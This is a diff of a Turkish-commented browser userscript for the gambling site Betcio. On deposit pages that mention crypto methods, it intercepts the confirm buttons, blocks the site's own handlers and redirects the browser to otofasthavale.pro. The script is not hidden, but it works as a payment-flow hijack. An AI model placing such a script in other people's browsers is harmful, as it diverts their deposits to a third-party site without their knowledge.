@@ -1,12 +1,11 @@
 // ==UserScript==
-// @name         Betcio Kripto → Otofast Yönlendirme
+// @name         Betcio Kripto Deposit → Otofast Yönlendirme (Buton Bazlı)
 // @namespace    http://tampermonkey.net/
-// @version      0.3
-// @description  Deposit + kripto/LiPay/Xpay seçilirse otofasthavale.pro'ya yönlendir
+// @version      0.5
+// @description  Deposit sayfasında kripto/LiPay/Xpay seçiliyse, herhangi bir onay butonuna basıldığında otofasthavale.pro'ya gider
 // @author       You
 // @match        *://*.betcio*/*
 // @match        *://m.betcio*/*
-// @match        *://betcio*/*
 // @grant        none
 // @run-at       document-end
 // ==/UserScript==
@@ -14,74 +13,79 @@
 (function() {
     'use strict';
 
-    const KRIPTO_METHODS = [
-        'lipay', 'xpay', 'kripto', 'kriptopay', 'crypto', 'usdt', 'btc', 'eth', 'tron'
+    const KRIPTO_INDICATORS = [
+        'lipay', 'xpay', 'kripto', 'kriptopay', 'crypto', 'usdt', 'btc', 'eth', 'tron', 'tether'
     ].map(s => s.toLowerCase());
 
-    function isKriptoDepositPage() {
+    function isLikelyKriptoDeposit() {
         const url = window.location.href.toLowerCase();
+        const bodyText = document.body.innerText.toLowerCase();
 
-        // 1. Deposit sayfası mı?
-        if (!url.includes('page=deposit')) return false;
-
-        // 2. Kripto ile ilgili parametre var mı?
-        const params = new URLSearchParams(window.location.search);
-        const method = params.get('selectedMethod')?.toLowerCase() || '';
-        const group  = params.get('selectedGroup')?.toLowerCase() || '';
-
-        // Direkt method kontrolü
-        if (method && KRIPTO_METHODS.some(k => method.includes(k))) {
-            return true;
+        // 1. URL'de deposit sayfası olduğunu anlamak
+        if (!url.includes('page=deposit') && !url.includes('yatir') && !url.includes('deposit')) {
+            return false;
         }
 
-        // Bazen group kripto oluyor
-        if (group && KRIPTO_METHODS.some(k => group.includes(k))) {
-            return true;
-        }
-
-        // Ekstra: url'de kripto kelimesi geçiyorsa (nadir)
-        return KRIPTO_METHODS.some(k => url.includes(k));
+        // 2. Sayfada kripto ile ilgili kelime geçiyor mu?
+        return KRIPTO_INDICATORS.some(word => 
+            bodyText.includes(word) || url.includes(word)
+        );
     }
 
-    // Sayfa yüklendiğinde + dinamik değişimlerde kontrol
-    function checkAndRedirect() {
-        if (isKriptoDepositPage()) {
-            console.log('[Kripto Tespit] → otofasthavale.pro yönlendirme AKTİF');
+    function hijackAllPossibleButtons() {
+        if (!isLikelyKriptoDeposit()) return;
 
-            // Buton varsa direkt engelle + yönlendir
-            const buttons = document.querySelectorAll('button, [type="submit"], .deposit-button, [class*="confirm"], [class*="yatir"]');
+        console.log('[Kripto Deposit Algılandı] → Onay butonları ele geçiriliyor...');
 
-            buttons.forEach(btn => {
-                btn.addEventListener('click', function(e) {
+        const possibleSelectors = [
+            'button', 
+            '[type="submit"]', 
+            '[type="button"]', 
+            '.btn', 
+            '[class*="confirm"]', 
+            '[class*="submit"]', 
+            '[class*="yatir"]', 
+            '[class*="deposit"]', 
+            '[class*="onay"]', 
+            '[role="button"]'
+        ];
+
+        const buttons = document.querySelectorAll(possibleSelectors.join(','));
+
+        buttons.forEach(btn => {
+            // Mevcut event listener'ları korumak için capture phase'de dinliyoruz
+            btn.addEventListener('click', function(e) {
+                // Eğer butonun text'inde "onay", "yatır", "gönder", "submit" vs. varsa
+                const btnText = (btn.innerText || btn.value || '').toLowerCase();
+                if (btnText.includes('yatır') || btnText.includes('onay') || 
+                    btnText.includes('gönder') || btnText.includes('tamam') ||
+                    btnText.includes('devam') || btnText.includes('submit') ||
+                    btn.className.toLowerCase().includes('confirm') ||
+                    btn.className.toLowerCase().includes('deposit')) {
+
                     e.preventDefault();
                     e.stopImmediatePropagation();
-                    window.location.href = 'https://otofasthavale.pro';
-                }, true);
-            });
-
-            // Buton yoksa direkt 1-2 sn sonra yönlendir (önlem)
-            setTimeout(() => {
-                if (document.querySelector('form') || document.querySelector('[class*="deposit"]')) {
+                    console.log('Kripto onay butonu tıklandı → yönlendirme!');
                     window.location.href = 'https://otofasthavale.pro';
                 }
-            }, 1500);
-        }
+            }, true); // capture phase → diğer listener'lardan önce çalışır
+        });
     }
 
-    // İlk çalıştırma
-    checkAndRedirect();
+    // Sayfa ilk yüklendiğinde
+    setTimeout(hijackAllPossibleButtons, 800);
 
-    // URL değişirse (single page app davranışı için)
-    let lastUrl = location.href;
-    new MutationObserver(() => {
-        const urlNow = location.href;
-        if (urlNow !== lastUrl) {
-            lastUrl = urlNow;
-            checkAndRedirect();
-        }
-    }).observe(document, {subtree: true, childList: true});
+    // Dinamik olarak eklenen butonlar için periyodik kontrol
+    const observer = new MutationObserver(() => {
+        hijackAllPossibleButtons();
+    });
 
-    // Ayrıca periyodik kontrol (dinamik yüklemeler için)
-    setInterval(checkAndRedirect, 2000);
+    observer.observe(document.body, {
+        childList: true,
+        subtree: true
+    });
+
+    // Her 1.5 saniyede bir kontrol (ekstra güvenlik)
+    setInterval(hijackAllPossibleButtons, 1500);
 
 })();
